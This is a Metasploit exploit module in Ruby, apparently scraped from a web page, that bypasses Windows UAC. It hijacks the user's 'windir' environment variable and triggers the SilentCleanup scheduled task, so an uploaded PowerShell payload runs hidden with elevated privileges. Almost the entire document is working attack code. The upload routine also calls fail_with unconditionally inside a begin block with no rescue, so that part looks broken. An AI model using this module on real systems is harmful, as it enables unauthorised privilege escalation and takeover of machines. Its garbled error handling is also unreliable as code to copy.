# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                 => &#039;Windows Escalate UAC Protection Bypass (Via SilentCleanup)&#039;,
      &#039;Description&#039;          => %q{
        There&#039;s a task in Windows Task Scheduler called "SilentCleanup" which, while it&#039;s executed as Users, automatically runs with elevated privileges.
        When it runs, it executes the file %windir%\system32\cleanmgr.exe. Since it runs as Users, and we can control user&#039;s environment variables,
        %windir% (normally pointing to C:\Windows) can be changed to point to whatever we want, and it&#039;ll run as admin.
      },
      &#039;License&#039;              => MSF_LICENSE,
      &#039;Author&#039;               => [
        &#039;tyranid&#039;, # Discovery
        &#039;enigma0x3&#039;, # Discovery
        &#039;nyshone69&#039;, # Discovery
        &#039;Carter Brainerd (cbrnrd)&#039; # Metasploit Module
      ],
      &#039;Platform&#039;             => [&#039;win&#039;],
      &#039;Arch&#039;                 => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;              => [[&#039;Microsoft Windows&#039;, {}]],
      &#039;DisclosureDate&#039;       => &#039;Feb 24 2019&#039;,
      &#039;References&#039;           => [
        [&#039;URL&#039;, &#039;https://tyranidslair.blogspot.com/2017/05/exploiting-environment-variables-in.html&#039;],
        [&#039;URL&#039;, &#039;https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/&#039;],
        [&#039;URL&#039;, &#039;https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/&#039;],
        [&#039;URL&#039;, &#039;https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/&#039;]
      ]
    ))

    register_options(
      [
        OptInt.new(&#039;SLEEPTIME&#039;, [false, &#039;The time (ms) to sleep before running SilentCleanup&#039;, 0]),
        OptString.new(&#039;PSH_PATH&#039;, [true, &#039;The path to the Powershell binary.&#039;, "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"])
      ])
  end

  def get_bypass_script(cmd)
    scr = %Q{
      if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
        #{cmd}
      } else {
          $registryPath = "HKCU:\\Environment"
          $Name = "windir"
          $Value = "powershell -ExecutionPolicy bypass -windowstyle hidden -Command `"& `&#039;$PSCommandPath`&#039;`";#"
          Set-ItemProperty -Path $registryPath -Name $name -Value $Value
          #Depending on the performance of the machine, some sleep time may be required before or after schtasks
          Start-Sleep -Milliseconds #{datastore[&#039;SLEEPTIME&#039;]}
          schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I | Out-Null
          Remove-ItemProperty -Path $registryPath -Name $name
      }
    }
    vprint_status(scr)
    scr
  end

  def exploit
    check_permissions

    e_vars = get_envs(&#039;TEMP&#039;)
    payload_fp = "#{e_vars[&#039;TEMP&#039;]}\\#{rand_text_alpha(8)}.ps1"

    # Write it to disk, run, delete
    upload_payload_ps1(payload_fp)
    vprint_good("Payload uploaded to #{payload_fp}")

    cmd_exec("#{expand_path(datastore[&#039;PSH_PATH&#039;])} -ep bypass #{payload_fp}")
  end

  def check_permissions
    # Check if you are an admin
    case is_in_admin_group?
    when nil
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    when true
      print_good(&#039;Part of Administrators group! Continuing...&#039;)
    when false
      fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end

  def upload_payload_ps1(filepath)
    pld = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
    begin
      vprint_status(&#039;Uploading payload PS1...&#039;)
      write_file(filepath, get_bypass_script(pld))
      register_file_for_cleanup(filepath)
      fail_with(Failure::Unknown, "Error uploading file #{filepath}: #{e.class} #{e}")
    end
  end
end

